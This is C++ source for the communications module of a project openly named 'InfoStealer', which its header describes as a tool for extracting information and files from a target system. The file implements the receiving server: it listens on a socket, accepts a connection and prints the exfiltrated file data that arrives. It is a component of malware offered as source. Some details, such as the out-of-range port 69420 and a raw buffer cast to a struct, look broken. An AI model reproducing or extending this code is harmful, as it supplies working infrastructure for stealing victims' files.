/*
* InfoStealer - Extracts information and interesting files from a target system.
* Copyright (C) 2023 Sebastian Hasch - <https://github.com/Zelyson/InfoStealer>
*
* This program is free software licensed under the GNU General Public License version 3:
* you can redistribute it and/or modify it under the terms of the
* GNU General Public License version 3 as published by the Free Software Foundation.
*
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <https://www.gnu.org/licenses/gpl-3.0>.
*/
#include <iostream>
#include <stdio.h>

#include <future>
#include <WinSock2.h>
#pragma comment(lib,"WS2_32")

#include "../../include/comms/comms.hpp"

constexpr auto ADDRESS = L"127.0.0.1";
constexpr auto PORT = 69420;

comms::comms() {
	WSADATA wsa_data;
	SOCKADDR_IN server_addr;

	WSAStartup(MAKEWORD(2, 2), &wsa_data);
	this->server = socket(AF_INET, SOCK_STREAM, 0);

	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);

	::bind(server, reinterpret_cast<SOCKADDR*>(&server_addr), sizeof(server_addr));
	listen(server, 0);
	this->client_addr_size = sizeof(this->client_addr);
}

comms::~comms() {
	WSACleanup();
}

int comms::start() {

	std::cout << "Listening for incoming connections..." << std::endl;
	SOCKET client;
	char* buffer = (char*) malloc(sizeof(util::Packet));

	if ((client = accept(this->server, reinterpret_cast<SOCKADDR *>(&this->client_addr), &this->client_addr_size)) != INVALID_SOCKET)
	{
		printf("Connected:\n");
		while (true) {
			comms::recieve(client, buffer);
			const auto last_error = WSAGetLastError();
			if(last_error > 0)
			{
				std::cout << "Error: " << last_error << std::endl;
				return last_error;
			}
		}
	}

	closesocket(client);
	std::cout << "Client disconnected." << std::endl;
	return 0;
}

void comms::recieve(SOCKET client, char* buffer) {
	recv(client, buffer, sizeof(util::Packet), 0);
	util::Packet* packet = (util::Packet*)buffer;
	printf("Type: %s\n", packet->type);
	std::cout << packet->file.size << std::endl;
	printf("Data:\n");
	for (int i = 0; i < packet->file.size; i++) {
		std::cout << packet->file.buffer[i];
	}

} 
